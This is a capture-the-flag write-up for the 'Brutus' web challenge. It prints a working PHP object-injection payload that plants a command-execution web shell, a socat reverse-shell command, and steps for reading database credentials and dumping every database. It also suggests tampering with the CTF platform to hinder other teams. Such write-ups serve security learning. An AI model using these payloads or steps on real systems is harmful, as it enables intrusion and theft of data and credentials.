# How Brutus stole Christmas (Web 492, 13 solves)
We sign up to the platform to view the challenges. Looking around, there's nothing exploitable looking on the platform itself.
There are two web challenges listed: a "Brutus" challenge and an actually impossible challenge.
The Brutus challenge is a pretty spicy Geocities site clone, but at the bottom of the HTML it tells us to go to ?source=1.
This shows the challenge takes an optional base64 encoded footer from the query and unserializes it. Conviniently there's an object with an arbitrary write destructor, so we can apply the textbook object injection example from like [here](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection). We'll craft a payload that simply writes out a script that runs commands we pass it and prints the output.

```
O:11:"pageContent":2:{s:9:"file_name";s:14:"data/shell.php";s:10:"newContent";s:63:"<?php $o=[];exec($_GET["cmd"], $o); print(implode("\n",$o)); ?>";}
http://challs.xmas.htsp.ro:3050/?newFooter=TzoxMToicGFnZUNvbnRlbnQiOjI6e3M6OToiZmlsZV9uYW1lIjtzOjE0OiJkYXRhL3NoZWxsLnBocCI7czoxMDoibmV3Q29udGVudCI7czo2MzoiPD9waHAgJG89W107ZXhlYygkX0dFVFsiY21kIl0sICRvKTsgcHJpbnQoaW1wbG9kZSgiXG4iLCRvKSk7ID8%2BIjt9
```

Exploring installed binaries with `ls`, we find socat as best candidate for a reverse shell (taken from GTFObins):
```
http://challs.xmas.htsp.ro:3050/data/shell.php?cmd=exec socat tcp-connect:ip:port exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

Now that we're in we see that this is the same server the CTFx instance is running on. (We can also verify the harder challenge is actually impossible...)
We use the official repo to find DB credentials are located at /var/www/ctfx/include/config/db.default.inc.php.
Use these credentials with `mysqldump -u mellivora -p=password --all-databases > tmp`, and download with browser.
Searching the dump we see our flag in the challenges table: `X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}`.
At this point you could fuck around with the CTFx instance if you wanted and hide the Brutus challenge URL to make it practically impossible :p

Since we're done we `rm tmp` and `rm shell.php` to make sure we aren't helping future teams.